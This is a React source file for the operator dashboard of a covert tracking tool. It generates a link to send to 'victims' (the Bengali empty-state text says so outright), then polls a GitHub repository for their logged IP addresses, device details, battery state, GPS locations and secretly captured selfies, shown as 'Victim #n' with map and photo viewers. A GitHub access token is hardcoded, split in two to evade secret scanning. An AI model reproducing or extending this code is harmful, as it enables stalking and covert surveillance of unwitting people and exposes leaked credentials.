
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { auth } from '../firebase';

interface LogEntry {
  id: string;
  time: string;
  ip: string;
  platform: string;
  userAgent: string;
  ram: string;
  cores: number | string;
  screen: string;
  battery: any;
  location: any;
  photo: string | null;
  userId: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhoto, setViewPhoto] = useState<string | null>(null);

  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  const fetchLogs = async () => {
    try {
      const res = await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/data/logs`, {
        headers: { 'Authorization': `token ${G_TOKEN}` }
      });
      if (!res.ok) { setLoading(false); return; }
      const files = await res.json();
      
      const logPromises = files.filter((f: any) => f.name.endsWith('.json')).map(async (file: any) => {
        const contentRes = await fetch(file.download_url);
        const data = await contentRes.json();
        return { id: file.name, ...data };
      });

      const allLogs = await Promise.all(logPromises);
      const myLogs = allLogs.filter(l => l.userId === user.uid);
      setLogs(myLogs.sort((a, b) => b.id.localeCompare(a.id)));
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 15000);
    return () => clearInterval(interval);
  }, [user.uid]);

  return (
    <div className="min-h-screen bg-[#F8FAFC] font-['Hind_Siliguri'] text-slate-800">
      {/* Header */}
      <nav className="bg-white/80 backdrop-blur-md border-b sticky top-0 z-50 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-2">
           <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center text-white font-black">V</div>
           <h1 className="text-xl font-black tracking-tighter">VAULT ADMIN</h1>
        </div>
        <button onClick={() => signOut(auth)} className="bg-slate-100 px-4 py-2 rounded-xl text-[10px] font-black hover:bg-red-50 hover:text-red-600 transition-all">SIGN OUT</button>
      </nav>

      <main className="max-w-6xl mx-auto p-4 md:p-8 space-y-8">
        {/* Tracker Section */}
        <section className="bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm">
           <p className="text-[10px] font-black text-blue-600 uppercase tracking-[0.2em] mb-3">Your Tracking Gateway</p>
           <div className="flex flex-col md:flex-row gap-3">
              <input readOnly value={trackerLink} className="flex-1 bg-slate-50 border border-slate-100 px-6 py-4 rounded-2xl text-xs font-mono text-slate-500 outline-none" />
              <button onClick={() => { navigator.clipboard.writeText(trackerLink); setCopySuccess(true); setTimeout(()=>setCopySuccess(false), 2000); }} 
                className="bg-blue-600 text-white px-10 py-4 rounded-2xl font-black text-xs hover:bg-blue-700 transition-all shadow-xl shadow-blue-100">
                {copySuccess ? 'COPIED!' : 'COPY LINK'}
              </button>
           </div>
        </section>

        {/* Logs Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {loading ? (
            <div className="col-span-full text-center py-20 opacity-50">লোডিং হচ্ছে...</div>
          ) : logs.length === 0 ? (
            <div className="col-span-full text-center py-20 bg-white rounded-[40px] border-2 border-dashed border-slate-200">
               <p className="text-slate-400 font-bold italic">কোনো ভিক্টিম পাওয়া যায়নি। আপনার লিংকটি ভিক্টিমকে পাঠান।</p>
            </div>
          ) : logs.map((log, index) => {
            const hasLoc = typeof log.location === 'object';
            return (
              <div key={log.id} className="bg-white rounded-[40px] border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
                {/* Status Bar */}
                <div className="px-8 py-4 bg-slate-50 border-b flex justify-between items-center">
                   <span className="text-[10px] font-black text-slate-400 uppercase">Victim #{logs.length - index}</span>
                   <div className="flex items-center gap-1.5">
                      <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="text-[10px] font-black text-slate-600">LIVE DATA</span>
                   </div>
                </div>

                <div className="p-8 space-y-6">
                   {/* Main Header */}
                   <div className="flex justify-between items-start">
                      <div>
                         <h3 className="text-2xl font-black text-slate-900 leading-none mb-1">{log.ip}</h3>
                         <p className="text-xs text-blue-600 font-bold italic">{log.time}</p>
                      </div>
                      <div className="text-right">
                         <p className="text-[9px] font-black text-slate-400 uppercase">Battery</p>
                         <p className="font-black text-slate-800">{typeof log.battery === 'object' ? `${log.battery.level}% ${log.battery.charging ? '⚡' : ''}` : log.battery}</p>
                      </div>
                   </div>

                   {/* Tech Specs Grid */}
                   <div className="grid grid-cols-3 gap-3">
                      <div className="bg-slate-50 p-4 rounded-3xl border border-slate-100">
                         <p className="text-[8px] font-black text-slate-400 uppercase mb-1">RAM</p>
                         <p className="text-xs font-black text-slate-800">{log.ram}</p>
                      </div>
                      <div className="bg-slate-50 p-4 rounded-3xl border border-slate-100">
                         <p className="text-[8px] font-black text-slate-400 uppercase mb-1">CPU</p>
                         <p className="text-xs font-black text-slate-800">{log.cores} Core</p>
                      </div>
                      <div className="bg-slate-50 p-4 rounded-3xl border border-slate-100">
                         <p className="text-[8px] font-black text-slate-400 uppercase mb-1">SCREEN</p>
                         <p className="text-xs font-black text-slate-800">{log.screen}</p>
                      </div>
                   </div>

                   {/* Browser/Device Info */}
                   <div className="bg-blue-50/50 p-4 rounded-3xl border border-blue-100/50">
                      <p className="text-[8px] font-black text-blue-400 uppercase mb-1">Device / OS</p>
                      <p className="text-[10px] font-medium text-slate-600 line-clamp-2">{log.userAgent}</p>
                   </div>

                   {/* Actions */}
                   <div className="flex gap-3 pt-2">
                      <button 
                        disabled={!log.photo}
                        onClick={() => setViewPhoto(log.photo)}
                        className={`flex-1 py-4 rounded-2xl text-[11px] font-black transition-all ${log.photo ? 'bg-slate-900 text-white shadow-xl shadow-slate-200' : 'bg-slate-100 text-slate-300'}`}
                      >
                        VIEW SELFIE
                      </button>
                      <button 
                        disabled={!hasLoc}
                        onClick={() => setViewMap(log.location)}
                        className={`flex-1 py-4 rounded-2xl text-[11px] font-black transition-all ${hasLoc ? 'bg-blue-600 text-white shadow-xl shadow-blue-100' : 'bg-slate-100 text-slate-300'}`}
                      >
                        VIEW MAP
                      </button>
                   </div>
                </div>
              </div>
            );
          })}
        </div>
      </main>

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-lg rounded-[45px] overflow-hidden shadow-2xl">
              <div className="p-7 flex justify-between items-center border-b">
                 <h4 className="font-black text-slate-800 text-sm uppercase tracking-widest">Location Intel</h4>
                 <button onClick={() => setViewMap(null)} className="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400">✕</button>
              </div>
              <iframe width="100%" height="350" frameBorder="0" src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=16&output=embed`}></iframe>
              <div className="p-7">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="block w-full bg-blue-600 text-white py-5 rounded-3xl font-black text-xs text-center shadow-xl shadow-blue-100">OPEN IN GOOGLE MAPS</a>
              </div>
           </div>
        </div>
      )}

      {/* Photo Modal */}
      {viewPhoto && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-md rounded-[50px] overflow-hidden shadow-2xl">
              <div className="p-7 flex justify-between items-center border-b bg-slate-50/50">
                 <h4 className="font-black text-slate-800 text-sm uppercase">Live Capture</h4>
                 <button onClick={() => setViewPhoto(null)} className="w-8 h-8 bg-white rounded-full flex items-center justify-center text-slate-400 shadow-sm">✕</button>
              </div>
              <div className="p-8 bg-slate-100">
                 <img src={viewPhoto} className="w-full rounded-[35px] border-[6px] border-white shadow-2xl scale-105 rotate-1" alt="Victim" />
              </div>
              <div className="p-8 text-center">
                 <button onClick={() => setViewPhoto(null)} className="bg-slate-900 text-white px-12 py-5 rounded-3xl font-black text-xs">CLOSE REPORT</button>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
